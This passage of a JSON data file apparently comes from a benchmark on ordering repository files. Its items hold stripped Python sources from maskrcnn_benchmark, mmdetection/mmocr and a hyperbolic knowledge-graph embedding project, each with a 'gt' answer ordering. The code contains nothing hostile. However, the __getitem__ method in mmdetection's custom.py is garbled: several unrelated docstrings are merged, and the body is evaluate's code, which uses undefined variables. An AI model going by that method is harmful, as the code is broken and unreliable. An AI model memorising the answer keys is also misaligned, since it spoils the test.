padding=1):\n\n    mask = mask.float()\n    box = box.float()\n\n    padded_mask, scale = expand_masks(mask[None], padding=padding)\n    mask = padded_mask[0, 0]\n    box = expand_boxes(box[None], scale)[0]\n    box = box.to(dtype=torch.int32)\n\n    TO_REMOVE = 1\n    w = int(box[2] - box[0] + TO_REMOVE)\n    h = int(box[3] - box[1] + TO_REMOVE)\n    w = max(w, 1)\n    h = max(h, 1)\n\n\n    mask = mask.expand((1, 1, -1, -1))\n\n\n    mask = mask.to(torch.float32)\n    mask = interpolate(mask, size=(h, w), mode='bilinear', align_corners=False)\n    mask = mask[0][0]\n\n    if thresh >= 0:\n        mask = mask > thresh\n    else:\n\n\n        mask = (mask * 255).to(torch.bool)\n\n    im_mask = torch.zeros((im_h, im_w), dtype=torch.bool)\n    x_0 = max(box[0], 0)\n    x_1 = min(box[2] + 1, im_w)\n    y_0 = max(box[1], 0)\n    y_1 = min(box[3] + 1, im_h)\n\n    im_mask[y_0:y_1, x_0:x_1] = mask[\n        (y_0 - box[1]) : (y_1 - box[1]), (x_0 - box[0]) : (x_1 - box[0])\n    ]\n    return im_mask\n\n\nclass Masker(object):\n\n\n    def __init__(self, threshold=0.5, padding=1):\n        self.threshold = threshold\n        self.padding = padding\n\n    def forward_single_image(self, masks, boxes):\n        boxes = boxes.convert(\"xyxy\")\n        im_w, im_h = boxes.size\n        res = [\n            paste_mask_in_image(mask[0], box, im_h, im_w, self.threshold, self.padding)\n            for mask, box in zip(masks, boxes.bbox)\n        ]\n        if len(res) > 0:\n            res = torch.stack(res, dim=0)[:, None]\n        else:\n            res = masks.new_empty((0, 1, masks.shape[-2], masks.shape[-1]))\n        return res\n\n    def __call__(self, masks, boxes):\n        if isinstance(boxes, BoxList):\n            boxes = [boxes]\n\n\n        assert len(boxes) == len(masks), \"Masks and boxes should have the same length.\"\n\n\n\n        results = []\n        for mask, box in zip(masks, boxes):\n            assert mask.shape[0] == len(box), \"Number of objects should be the same.\"\n            result = self.forward_single_image(mask, box)\n            results.append(result)\n        return results\n\n\ndef make_roi_mask_post_processor(cfg):\n    if cfg.MODEL.ROI_MASK_HEAD.POSTPROCESS_MASKS:\n        mask_threshold = cfg.MODEL.ROI_MASK_HEAD.POSTPROCESS_MASKS_THRESHOLD\n        masker = Masker(threshold=mask_threshold, padding=1)\n    else:\n        masker = None\n    mask_post_processor = MaskPostProcessor(masker)\n    return mask_post_processor\n\n'MABN/det/maskrcnn_benchmark/layers/misc.py'\n:\n\n\nimport math\nimport torch\nfrom torch import nn\nfrom torch.nn.modules.utils import _ntuple\nfrom maskrcnn_benchmark.distributed_syncbn.syncbn import DistributedSyncBN\n\n\nclass _NewEmptyTensorOp(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, x, new_shape):\n        ctx.shape = x.shape\n        return x.new_empty(new_shape)\n\n    @staticmethod\n    def backward(ctx, grad):\n        shape = ctx.shape\n        return _NewEmptyTensorOp.apply(grad, shape), None\n\n\nclass Conv2d(torch.nn.Conv2d):\n    def forward(self, x):\n        if x.numel() > 0:\n            return super(Conv2d, self).forward(x)\n\n\n        output_shape = [\n            (i + 2 * p - (di * (k - 1) + 1)) // d + 1\n            for i, p, di, k, d in zip(\n                x.shape[-2:], self.padding, self.dilation, self.kernel_size, self.stride\n            )\n        ]\n        output_shape = [x.shape[0], self.weight.shape[0]] + output_shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\nclass CenConv2d(nn.Module):\n\n    def __init__(self, in_planes, out_planes, kernel_size=3, stride=1,\n                 padding=0, dilation=1, groups=1, bias=False):\n        super(CenConv2d, self).__init__()\n        self.in_planes = in_planes\n        self.out_planes = out_planes\n        self.stride = stride\n        self.padding = padding\n        self.dilation = dilation\n        self.groups = groups\n        self.kernel_size = kernel_size\n        self.weight = nn.Parameter(torch.randn(out_planes, in_planes//groups, kernel_size, kernel_size))\n        if bias:\n            self.bias = nn.Parameter(torch.randn(out_planes))\n        else:\n            self.register_parameter('bias', None)\n\n    def forward(self, x):\n        weight = self.weight\n        weight_mean = weight.mean(dim=1, keepdim=True).mean(dim=2, keepdim=True).mean(dim=3, keepdim=True)\n        weight = weight - weight_mean\n        if x.numel() > 0:\n            return nn.functional.conv2d(x, weight, self.bias, self.stride, self.padding, self.dilation, self.groups)\n        _pair = _ntuple(2)\n        output_shape = [\n            (i + 2 * p - (di * (k - 1) + 1)) // d + 1\n            for i, p, di, k, d in zip(\n                x.shape[-2:], _pair(self.padding), _pair(self.dilation), _pair(self.kernel_size), _pair(self.stride)\n            )\n        ]\n        output_shape = [x.shape[0], self.weight.shape[0]] + output_shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\n\n\nclass ConvTranspose2d(torch.nn.ConvTranspose2d):\n    def forward(self, x):\n        if x.numel() > 0:\n            return super(ConvTranspose2d, self).forward(x)\n\n\n        output_shape = [\n            (i - 1) * d - 2 * p + (di * (k - 1) + 1) + op\n            for i, p, di, k, d, op in zip(\n                x.shape[-2:],\n                self.padding,\n                self.dilation,\n                self.kernel_size,\n                self.stride,\n                self.output_padding,\n            )\n        ]\n        output_shape = [x.shape[0], self.bias.shape[0]] + output_shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\n\nclass BatchNorm2d(torch.nn.BatchNorm2d):\n    def forward(self, x):\n        if x.numel() > 0:\n            return super(BatchNorm2d, self).forward(x)\n\n        output_shape = x.shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\n\nclass SyncBatchNorm2d(DistributedSyncBN):\n    def forward(self, x):\n        if x.numel() > 0:\n            return super(SyncBatchNorm2d, self).forward(x)\n\n        output_shape = x.shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\n\ndef interpolate(\n    input, size=None, scale_factor=None, mode=\"nearest\", align_corners=None\n):\n    if input.numel() > 0:\n        return torch.nn.functional.interpolate(\n            input, size, scale_factor, mode, align_corners\n        )\n\n    def _check_size_scale_factor(dim):\n        if size is None and scale_factor is None:\n            raise ValueError(\"either size or scale_factor should be defined\")\n        if size is not None and scale_factor is not None:\n            raise ValueError(\"only one of size or scale_factor should be defined\")\n        if (\n            scale_factor is not None\n            and isinstance(scale_factor, tuple)\n            and len(scale_factor) != dim\n        ):\n            raise ValueError(\n                \"scale_factor shape must match input shape. \"\n                \"Input is {}D, scale_factor size is {}\".format(dim, len(scale_factor))\n            )\n\n    def _output_size(dim):\n        _check_size_scale_factor(dim)\n        if size is not None:\n            return size\n        scale_factors = _ntuple(dim)(scale_factor)\n\n        return [\n            int(math.floor(input.size(i + 2) * scale_factors[i])) for i in range(dim)\n        ]\n\n    output_shape = tuple(_output_size(2))\n    output_shape = input.shape[:-2] + output_shape\n    return _NewEmptyTensorOp.apply(input, output_shape)\n\n\nclass DFConv2d(nn.Module):\n\n    def __init__(\n        self,\n        in_channels,\n        out_channels,\n        with_modulated_dcn=True,\n        kernel_size=3,\n        stride=1,\n        groups=1,\n        dilation=1,\n        deformable_groups=1,\n        bias=False\n    ):\n        super(DFConv2d, self).__init__()\n        if isinstance(kernel_size, (list, tuple)):\n            assert isinstance(stride, (list, tuple))\n            assert isinstance(dilation, (list, tuple))\n            assert len(kernel_size) == 2\n            assert len(stride) == 2\n            assert len(dilation) == 2\n            padding = (\n                dilation[0] * (kernel_size[0] - 1) // 2,\n                dilation[1] * (kernel_size[1] - 1) // 2\n            )\n            offset_base_channels = kernel_size[0] * kernel_size[1]\n        else:\n            padding = dilation * (kernel_size - 1) // 2\n            offset_base_channels = kernel_size * kernel_size\n        if with_modulated_dcn:\n            from maskrcnn_benchmark.layers import ModulatedDeformConv\n            offset_channels = offset_base_channels * 3\n            conv_block = ModulatedDeformConv\n        else:\n            from maskrcnn_benchmark.layers import DeformConv\n            offset_channels = offset_base_channels * 2\n            conv_block = DeformConv\n        self.offset = Conv2d(\n            in_channels,\n            deformable_groups * offset_channels,\n            kernel_size=kernel_size,\n            stride=stride,\n            padding=padding,\n            groups=1,\n            dilation=dilation\n        )\n        for l in [self.offset,]:\n            nn.init.kaiming_uniform_(l.weight, a=1)\n            torch.nn.init.constant_(l.bias, 0.)\n        self.conv = conv_block(\n            in_channels,\n            out_channels,\n            kernel_size=kernel_size,\n            stride=stride,\n            padding=padding,\n            dilation=dilation,\n            groups=groups,\n            deformable_groups=deformable_groups,\n            bias=bias\n        )\n        self.with_modulated_dcn = with_modulated_dcn\n        self.kernel_size = kernel_size\n        self.stride = stride\n        self.padding = padding\n        self.dilation = dilation\n\n    def forward(self, x):\n        if x.numel() > 0:\n            if not self.with_modulated_dcn:\n                offset = self.offset(x)\n                x = self.conv(x, offset)\n            else:\n                offset_mask = self.offset(x)\n                offset = offset_mask[:, :18, :, :]\n                mask = offset_mask[:, -9:, :, :].sigmoid()\n                x = self.conv(x, offset, mask)\n            return x\n\n        output_shape = [\n            (i + 2 * p - (di * (k - 1) + 1)) // d + 1\n            for i, p, di, k, d in zip(\n                x.shape[-2:],\n                self.padding,\n                self.dilation,\n                self.kernel_size,\n                self.stride\n            )\n        ]\n        output_shape = [x.shape[0], self.conv.weight.shape[0]] + output_shape\n        return _NewEmptyTensorOp.apply(x, output_shape)\n\n'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/mask_head.py'\n:\nimport torch\nfrom torch import nn\n\nfrom maskrcnn_benchmark.structures.bounding_box import BoxList\n\nfrom .roi_mask_feature_extractors import make_roi_mask_feature_extractor\nfrom .roi_mask_predictors import make_roi_mask_predictor\nfrom .inference import make_roi_mask_post_processor\nfrom .loss import make_roi_mask_loss_evaluator\n\n\ndef keep_only_positive_boxes(boxes):\n\n    assert isinstance(boxes, (list, tuple))\n    assert isinstance(boxes[0], BoxList)\n    assert boxes[0].has_field(\"labels\")\n    positive_boxes = []\n    positive_inds = []\n    num_boxes = 0\n    for boxes_per_image in boxes:\n        labels = boxes_per_image.get_field(\"labels\")\n        inds_mask = labels > 0\n        inds = inds_mask.nonzero().squeeze(1)\n        positive_boxes.append(boxes_per_image[inds])\n        positive_inds.append(inds_mask)\n    return positive_boxes, positive_inds\n\n\nclass ROIMaskHead(torch.nn.Module):\n    def __init__(self, cfg, in_channels):\n        super(ROIMaskHead, self).__init__()\n        self.cfg = cfg.clone()\n        self.feature_extractor = make_roi_mask_feature_extractor(cfg, in_channels)\n        self.predictor = make_roi_mask_predictor(\n            cfg, self.feature_extractor.out_channels)\n        self.post_processor = make_roi_mask_post_processor(cfg)\n        self.loss_evaluator = make_roi_mask_loss_evaluator(cfg)\n\n    def forward(self, features, proposals, targets=None):\n\n\n        if self.training:\n\n            all_proposals = proposals\n            proposals, positive_inds = keep_only_positive_boxes(proposals)\n        if self.training and self.cfg.MODEL.ROI_MASK_HEAD.SHARE_BOX_FEATURE_EXTRACTOR:\n            x = features\n            x = x[torch.cat(positive_inds, dim=0)]\n        else:\n            x = self.feature_extractor(features, proposals)\n        mask_logits = self.predictor(x)\n\n        if not self.training:\n            result = self.post_processor(mask_logits, proposals)\n            return x, result, {}\n\n        loss_mask = self.loss_evaluator(proposals, mask_logits, targets)\n\n        return x, all_proposals, dict(loss_mask=loss_mask)\n\n\ndef build_roi_mask_head(cfg, in_channels):\n    return ROIMaskHead(cfg, in_channels)\n",
        "gt": [
            "'MABN/det/maskrcnn_benchmark/layers/misc.py'",
            "'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/inference.py'",
            "'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/mask_head.py'"
        ]
    },
    {
        "files": [
            "'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/custom.py'",
            "'MASTER-mmocr/mmocr/apis/inference.py'",
            "'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/__init__.py'",
            "'MASTER-mmocr/demo/image_demo.py'"
        ],
        "content": "'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/custom.py'\n:import os.path as osp\nimport warnings\nfrom collections import OrderedDict\n\nimport mmcv\nimport numpy as np\nfrom mmcv.utils import print_log\nfrom torch.utils.data import Dataset\n\nfrom mmdet.core import eval_map, eval_recalls\nfrom .builder import DATASETS\nfrom .pipelines import Compose\n\n\n@DATASETS.register_module()\nclass CustomDataset(Dataset):\n\n\n    CLASSES = None\n\n    def __init__(self,\n                 ann_file,\n                 pipeline,\n                 classes=None,\n                 data_root=None,\n                 img_prefix='',\n                 seg_prefix=None,\n                 proposal_file=None,\n                 test_mode=False,\n                 filter_empty_gt=True):\n        self.ann_file = ann_file\n        self.data_root = data_root\n        self.img_prefix = img_prefix\n        self.seg_prefix = seg_prefix\n        self.proposal_file = proposal_file\n        self.test_mode = test_mode\n        self.filter_empty_gt = filter_empty_gt\n        self.CLASSES = self.get_classes(classes)\n\n\n        if self.data_root is not None:\n            if not osp.isabs(self.ann_file):\n                self.ann_file = osp.join(self.data_root, self.ann_file)\n            if not (self.img_prefix is None or osp.isabs(self.img_prefix)):\n                self.img_prefix = osp.join(self.data_root, self.img_prefix)\n            if not (self.seg_prefix is None or osp.isabs(self.seg_prefix)):\n                self.seg_prefix = osp.join(self.data_root, self.seg_prefix)\n            if not (self.proposal_file is None\n                    or osp.isabs(self.proposal_file)):\n                self.proposal_file = osp.join(self.data_root,\n                                              self.proposal_file)\n\n        self.data_infos = self.load_annotations(self.ann_file)\n\n        if self.proposal_file is not None:\n            self.proposals = self.load_proposals(self.proposal_file)\n        else:\n            self.proposals = None\n\n\n        if not test_mode:\n            valid_inds = self._filter_imgs()\n            self.data_infos = [self.data_infos[i] for i in valid_inds]\n            if self.proposals is not None:\n                self.proposals = [self.proposals[i] for i in valid_inds]\n\n            self._set_group_flag()\n\n\n        self.pipeline = Compose(pipeline)\n\n    def __len__(self):\n\n        return len(self.data_infos)\n\n    def load_annotations(self, ann_file):\n\n        return mmcv.load(ann_file)\n\n    def load_proposals(self, proposal_file):\n\n        return mmcv.load(proposal_file)\n\n    def get_ann_info(self, idx):\n\n\n        return self.data_infos[idx]['ann']\n\n    def get_cat_ids(self, idx):\n\n\n        return self.data_infos[idx]['ann']['labels'].astype(np.int).tolist()\n\n    def pre_pipeline(self, results):\n\n        results['img_prefix'] = self.img_prefix\n        results['seg_prefix'] = self.seg_prefix\n        results['proposal_file'] = self.proposal_file\n        results['bbox_fields'] = []\n        results['mask_fields'] = []\n        results['seg_fields'] = []\n\n    def _filter_imgs(self, min_size=32):\n\n        if self.filter_empty_gt:\n            warnings.warn(\n                'CustomDataset does not support filtering empty gt images.')\n        valid_inds = []\n        for i, img_info in enumerate(self.data_infos):\n            if min(img_info['width'], img_info['height']) >= min_size:\n                valid_inds.append(i)\n        return valid_inds\n\n    def _set_group_flag(self):\n\n        self.flag = np.zeros(len(self), dtype=np.uint8)\n        for i in range(len(self)):\n            img_info = self.data_infos[i]\n            if img_info['width'] / img_info['height'] > 1:\n                self.flag[i] = 1\n\n    def _rand_another(self, idx):\n\n        pool = np.where(self.flag == self.flag[idx])[0]\n        return np.random.choice(pool)\n\n    def __getitem__(self, idx):\n        \"\"\"Get training/test data after pipeline.\n\n        Args:\n            idx (int): Index of data.\n\n        Returns:\n            dict: Training/test data (with annotation if `test_mode` is set \\\n                True).\n        Get training data and annotations after pipeline.\n\n        Args:\n            idx (int): Index of data.\n\n        Returns:\n            dict: Training data and annotation after pipeline with new keys \\\n                introduced by pipeline.\n        Get testing data  after pipeline.\n\n        Args:\n            idx (int): Index of data.\n\n        Returns:\n            dict: Testing data after pipeline with new keys introduced by \\\n                pipeline.\n        Get class names of current dataset.\n\n        Args:\n            classes (Sequence[str] | str | None): If classes is None, use\n                default CLASSES defined by builtin dataset. If classes is a\n                string, take it as a file name. The file contains the name of\n                classes where each line contains one class name. If classes is\n                a tuple or list, override the CLASSES defined by the dataset.\n\n        Returns:\n            tuple[str] or list[str]: Names of categories of the dataset.\n        Place holder to format result to dataset specific output.Evaluate the dataset.\n\n        Args:\n            results (list): Testing results of the dataset.\n            metric (str | list[str]): Metrics to be evaluated.\n            logger (logging.Logger | None | str): Logger used for printing\n                related information during evaluation. Default: None.\n            proposal_nums (Sequence[int]): Proposal number used for evaluating\n                recalls, such as recall@100, recall@1000.\n                Default: (100, 300, 1000).\n            iou_thr (float | list[float]): IoU threshold. Default: 0.5.\n            scale_ranges (list[tuple] | None): Scale ranges for evaluating mAP.\n                Default: None.\n        \"\"\"\n\n        if not isinstance(metric, str):\n            assert len(metric) == 1\n            metric = metric[0]\n        allowed_metrics = ['mAP', 'recall']\n        if metric not in allowed_metrics:\n            raise KeyError(f'metric {metric} is not supported')\n        annotations = [self.get_ann_info(i) for i in range(len(self))]\n        eval_results = OrderedDict()\n        iou_thrs = [iou_thr] if isinstance(iou_thr, float) else iou_thr\n        if metric == 'mAP':\n            assert isinstance(iou_thrs, list)\n            mean_aps = []\n            for iou_thr in iou_thrs:\n                print_log(f'\\n{\"-\" * 15}iou_thr: {iou_thr}{\"-\" * 15}')\n                mean_ap, _ = eval_map(\n                    results,\n                    annotations,\n                    scale_ranges=scale_ranges,\n                    iou_thr=iou_thr,\n                    dataset=self.CLASSES,\n                    logger=logger)\n                mean_aps.append(mean_ap)\n                eval_results[f'AP{int(iou_thr * 100):02d}'] = round(mean_ap, 3)\n            eval_results['mAP'] = sum(mean_aps) / len(mean_aps)\n        elif metric == 'recall':\n            gt_bboxes = [ann['bboxes'] for ann in annotations]\n            recalls = eval_recalls(\n                gt_bboxes, results, proposal_nums, iou_thr, logger=logger)\n            for i, num in enumerate(proposal_nums):\n                for j, iou in enumerate(iou_thrs):\n                    eval_results[f'recall@{num}@{iou}'] = recalls[i, j]\n            if recalls.shape[1] > 1:\n                ar = recalls.mean(axis=1)\n                for i, num in enumerate(proposal_nums):\n                    eval_results[f'AR@{num}'] = ar[i]\n        return eval_results\n\n'MASTER-mmocr/mmocr/apis/inference.py'\n:import numpy as np\nimport torch\nfrom mmcv.ops import RoIPool\nfrom mmcv.parallel import collate, scatter\n\nfrom mmdet.datasets import replace_ImageToTensor\nfrom mmdet.datasets.pipelines import Compose\n\n\ndef disable_text_recog_aug_test(cfg):\n\n    if cfg.data.test.pipeline[1].type == 'MultiRotateAugOCR':\n        cfg.data.test.pipeline = [\n            cfg.data.test.pipeline[0], *cfg.data.test.pipeline[1].transforms\n        ]\n\n    return cfg\n\n\ndef model_inference(model, imgs, batch_mode=False):\n\n\n    if isinstance(imgs, (list, tuple)):\n        is_batch = True\n        if not isinstance(imgs[0], (np.ndarray, str)):\n            raise AssertionError('imgs must be strings or numpy arrays')\n\n    elif isinstance(imgs, (np.ndarray, str)):\n        imgs = [imgs]\n        is_batch = False\n    else:\n        raise AssertionError('imgs must be strings or numpy arrays')\n\n    is_ndarray = isinstance(imgs[0], np.ndarray)\n\n    cfg = model.cfg\n\n    if batch_mode:\n        if cfg.data.test.pipeline[1].type == 'ResizeOCR':\n            if cfg.data.test.pipeline[1].max_width is None:\n                raise Exception('Free resize do not support batch mode '\n                                'since the image width is not fixed, '\n                                'for resize keeping aspect ratio and '\n                                'max_width is not give.')\n        cfg = disable_text_recog_aug_test(cfg)\n\n    device = next(model.parameters()).device\n\n    if is_ndarray:\n        cfg = cfg.copy()\n\n        cfg.data.test.pipeline[0].type = 'LoadImageFromNdarray'\n\n    cfg.data.test.pipeline = replace_ImageToTensor(cfg.data.test.pipeline)\n    test_pipeline = Compose(cfg.data.test.pipeline)\n\n    datas = []\n    for img in imgs:\n\n        if is_ndarray:\n\n            data = dict(img=img)\n        else:\n\n            data = dict(img_info=dict(filename=img), img_prefix=None)\n\n\n        data = test_pipeline(data)\n\n        if batch_mode:\n            if cfg.data.test.pipeline[1].type == 'MultiScaleFlipAug':\n                for key, value in data.items():\n                    data[key] = value[0]\n        datas.append(data)\n\n    if isinstance(datas[0]['img'], list) and len(datas) > 1:\n        raise Exception('aug test does not support '\n                        f'inference with batch size '\n                        f'{len(datas)}')\n\n    data = collate(datas, samples_per_gpu=len(imgs))\n\n\n    if isinstance(data['img_metas'], list):\n        data['img_metas'] = [\n            img_metas.data[0] for img_metas in data['img_metas']\n        ]\n    else:\n        data['img_metas'] = data['img_metas'].data\n\n    if isinstance(data['img'], list):\n        data['img'] = [img.data for img in data['img']]\n        if isinstance(data['img'][0], list):\n            data['img'] = [img[0] for img in data['img']]\n    else:\n        data['img'] = data['img'].data\n\n    if next(model.parameters()).is_cuda:\n\n        data = scatter(data, [device])[0]\n    else:\n        for m in model.modules():\n            assert not isinstance(\n                m, RoIPool\n            ), 'CPU inference with RoIPool is not supported currently.'\n\n\n    with torch.no_grad():\n        results = model(return_loss=False, rescale=True, **data)\n\n    if not is_batch:\n        return results[0]\n    else:\n        return results\n\n\ndef text_model_inference(model, input_sentence):\n\n\n    assert isinstance(input_sentence, str)\n\n    cfg = model.cfg\n    test_pipeline = Compose(cfg.data.test.pipeline)\n    data = {'text': input_sentence, 'label': {}}\n\n\n    data = test_pipeline(data)\n    if isinstance(data['img_metas'], dict):\n        img_metas = data['img_metas']\n    else:\n        img_metas = data['img_metas'].data\n\n    assert isinstance(img_metas, dict)\n    img_metas = {\n        'input_ids': img_metas['input_ids'].unsqueeze(0),\n        'attention_masks': img_metas['attention_masks'].unsqueeze(0),\n        'token_type_ids': img_metas['token_type_ids'].unsqueeze(0),\n        'labels': img_metas['labels'].unsqueeze(0)\n    }\n\n    with torch.no_grad():\n        result = model(None, img_metas, return_loss=False)\n    return result\n\n'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/__init__.py'\n:from .builder import DATASETS, PIPELINES, build_dataloader, build_dataset\nfrom .cityscapes import CityscapesDataset\nfrom .coco import CocoDataset\nfrom .custom import CustomDataset\nfrom .dataset_wrappers import (ClassBalancedDataset, ConcatDataset,\n                               RepeatDataset)\nfrom .deepfashion import DeepFashionDataset\nfrom .lvis import LVISDataset, LVISV1Dataset, LVISV05Dataset\nfrom .samplers import DistributedGroupSampler, DistributedSampler, GroupSampler\nfrom .utils import (NumClassCheckHook, get_loading_pipeline,\n                    replace_ImageToTensor)\nfrom .voc import VOCDataset\nfrom .wider_face import WIDERFaceDataset\nfrom .xml_style import XMLDataset\n\n__all__ = [\n    'CustomDataset', 'XMLDataset', 'CocoDataset', 'DeepFashionDataset',\n    'VOCDataset', 'CityscapesDataset', 'LVISDataset', 'LVISV05Dataset',\n    'LVISV1Dataset', 'GroupSampler', 'DistributedGroupSampler',\n    'DistributedSampler', 'build_dataloader', 'ConcatDataset', 'RepeatDataset',\n    'ClassBalancedDataset', 'WIDERFaceDataset', 'DATASETS', 'PIPELINES',\n    'build_dataset', 'replace_ImageToTensor', 'get_loading_pipeline',\n    'NumClassCheckHook'\n]\n\n'MASTER-mmocr/demo/image_demo.py'\n:from argparse import ArgumentParser\n\nimport mmcv\n\nfrom mmdet.apis import init_detector\nfrom mmocr.apis.inference import model_inference\nfrom mmocr.datasets import build_dataset\nfrom mmocr.models import build_detector\n\n\ndef main():\n    parser = ArgumentParser()\n    parser.add_argument('img', help='Image file.')\n    parser.add_argument('config', help='Config file.')\n    parser.add_argument('checkpoint', help='Checkpoint file.')\n    parser.add_argument('out_file', help='Path to save visualized image.')\n    parser.add_argument(\n        '--device', default='cuda:0', help='Device used for inference.')\n    parser.add_argument(\n        '--imshow',\n        action='store_true',\n        help='Whether show image with OpenCV.')\n    args = parser.parse_args()\n\n\n    model = init_detector(args.config, args.checkpoint, device=args.device)\n    if model.cfg.data.test['type'] == 'ConcatDataset':\n        model.cfg.data.test.pipeline = model.cfg.data.test['datasets'][\n            0].pipeline\n\n\n    result = model_inference(model, args.img)\n    print(f'result: {result}')\n\n\n    img = model.show_result(\n        args.img, result, out_file=args.out_file, show=False)\n\n    if img is None:\n        img = mmcv.imread(args.img)\n\n    mmcv.imwrite(img, args.out_file)\n    if args.imshow:\n        mmcv.imshow(img, 'predicted results')\n\n\nif __name__ == '__main__':\n    main()\n",
        "gt": [
            "'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/custom.py'",
            "'MASTER-mmocr/mmdetection-2.11.0/mmdet/datasets/__init__.py'",
            "'MASTER-mmocr/mmocr/apis/inference.py'",
            "'MASTER-mmocr/demo/image_demo.py'"
        ]
    },
    {
        "files": [
            "'neural-structured-learning/research/kg_hyp_emb/models/__init__.py'",
            "'neural-structured-learning/research/kg_hyp_emb/models/base.py'",
            "'neural-structured-learning/research/kg_hyp_emb/models/hyperbolic.py'",
            "'neural-structured-learning/research/kg_hyp_emb/train.py'"
        ],
        "content": "'neural-structured-learning/research/kg_hyp_emb/models/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom kg_hyp_emb.models.complex import Complex\nfrom kg_hyp_emb.models.complex import RotatE\nfrom kg_hyp_emb.models.euclidean import AttE\nfrom kg_hyp_emb.models.euclidean import CTDecomp\nfrom kg_hyp_emb.models.euclidean import MurE\nfrom kg_hyp_emb.models.euclidean import RefE\nfrom kg_hyp_emb.models.euclidean import RotE\nfrom kg_hyp_emb.models.euclidean import TransE\nfrom kg_hyp_emb.models.hyperbolic import AttH\nfrom kg_hyp_emb.models.hyperbolic import RefH\nfrom kg_hyp_emb.models.hyperbolic import RotH\nfrom kg_hyp_emb.models.hyperbolic import TransH\n\n'neural-structured-learning/research/kg_hyp_emb/models/base.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport abc\n\nfrom kg_hyp_emb.learning import regularizers\nimport numpy as np\nimport tensorflow as tf\n\n\nclass KGModel(tf.keras.Model, abc.ABC):\n\n\n  def __init__(self, sizes, args):\n\n    super(KGModel, self).__init__()\n    self.sizes = sizes\n    self.rank = args.rank\n    self.bias = args.bias\n    self.initializer = getattr(tf.keras.initializers, args.initializer)\n    self.entity_regularizer = getattr(regularizers, args.regularizer)(\n        args.entity_reg)\n    self.rel_regularizer = getattr(regularizers, args.regularizer)(args.rel_reg)\n    self.entity = tf.keras.layers.Embedding(\n        input_dim=sizes[0],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.entity_regularizer,\n        name='entity_embeddings')\n    self.rel = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='relation_embeddings')\n    train_biases = self.bias == 'learn'\n    self.bh = tf.keras.layers.Embedding(\n        input_dim=sizes[0],\n        output_dim=1,\n        embeddings_initializer='zeros',\n        name='head_biases',\n        trainable=train_biases)\n    self.bt = tf.keras.layers.Embedding(\n        input_dim=sizes[0],\n        output_dim=1,\n        embeddings_initializer='zeros',\n        name='tail_biases',\n        trainable=train_biases)\n    self.gamma = tf.Variable(\n        initial_value=args.gamma * tf.keras.backend.ones(1), trainable=False)\n\n  @abc.abstractmethod\n  def get_queries(self, input_tensor):\n\n    pass\n\n  @abc.abstractmethod\n  def get_rhs(self, input_tensor):\n\n    pass\n\n  @abc.abstractmethod\n  def get_candidates(self):\n\n    pass\n\n  @abc.abstractmethod\n  def similarity_score(self, lhs, rhs, eval_mode):\n\n    pass\n\n  def call(self, input_tensor, eval_mode=False):\n\n    lhs = self.get_queries(input_tensor)\n    lhs_biases = self.bh(input_tensor[:, 0])\n    if eval_mode:\n      rhs = self.get_candidates()\n      rhs_biases = self.bt.embeddings\n    else:\n      rhs = self.get_rhs(input_tensor)\n      rhs_biases = self.bt(input_tensor[:, 2])\n    predictions = self.score(lhs, lhs_biases, rhs, rhs_biases, eval_mode)\n    return predictions\n\n  def score(self, lhs, lhs_biases, rhs, rhs_biases, eval_mode):\n\n    score = self.similarity_score(lhs, rhs, eval_mode)\n    if self.bias == 'constant':\n      return score + self.gamma\n    elif self.bias == 'learn':\n      if eval_mode:\n        return score + lhs_biases + tf.transpose(rhs_biases)\n      else:\n        return score + lhs_biases + rhs_biases\n    else:\n      return score\n\n  def get_scores_targets(self, input_tensor):\n\n    cand = self.get_candidates()\n    cand_biases = self.bt.embeddings\n    lhs = self.get_queries(input_tensor)\n    lhs_biases = self.bh(input_tensor[:, 0])\n    rhs = self.get_rhs(input_tensor)\n    rhs_biases = self.bt(input_tensor[:, 2])\n    scores = self.score(lhs, lhs_biases, cand, cand_biases, eval_mode=True)\n    targets = self.score(lhs, lhs_biases, rhs, rhs_biases, eval_mode=False)\n    return scores.numpy(), targets.numpy()\n\n  def eval(self, examples, filters, batch_size=1000):\n\n    mean_rank = {}\n    mean_reciprocal_rank = {}\n    hits_at = {}\n    total_examples = examples.cardinality().numpy()\n    batch_size = min(batch_size, total_examples)\n    for missing in ['rhs', 'lhs']:\n      ranks = np.ones(total_examples)\n      for counter, input_tensor in enumerate(examples.batch(batch_size)):\n        if batch_size * counter >= total_examples:\n          break\n\n        if missing == 'lhs':\n          input_tensor = tf.concat([\n              input_tensor[:, 2:], input_tensor[:, 1:2] + self.sizes[1] // 2,\n              input_tensor[:, 0:1]\n          ],\n                                   axis=1)\n        scores, targets = self.get_scores_targets(input_tensor)\n        for i, query in enumerate(input_tensor):\n          query = query.numpy()\n          filter_out = filters[missing][(query[0], query[1])]\n          filter_out += [query[2]]\n          scores[i, filter_out] = -1e6\n        ranks[counter * batch_size:(counter + 1) * batch_size] += np.sum(\n            (scores >= targets), axis=1)\n\n\n      mean_rank[missing] = np.mean(ranks)\n      mean_reciprocal_rank[missing] = np.mean(1. / ranks)\n      hits_at[missing] = {}\n      for k in (1, 3, 10):\n        hits_at[missing][k] = np.mean(ranks <= k)\n    return mean_rank, mean_reciprocal_rank, hits_at\n\n'neural-structured-learning/research/kg_hyp_emb/models/hyperbolic.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import 